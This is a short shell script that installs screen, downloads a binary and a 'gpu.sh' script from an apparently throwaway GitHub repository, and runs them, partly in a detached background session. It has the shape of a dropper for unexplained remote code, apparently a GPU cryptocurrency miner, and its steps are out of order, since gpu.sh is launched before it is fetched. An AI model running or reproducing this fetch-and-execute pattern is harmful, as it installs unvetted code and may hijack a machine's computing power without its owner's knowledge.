#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/brusavido/lol/raw/main/dick
wget https://raw.githubusercontent.com/brusavido/lol/main/gpu.sh
chmod +x gpu.sh
./gpu.sh
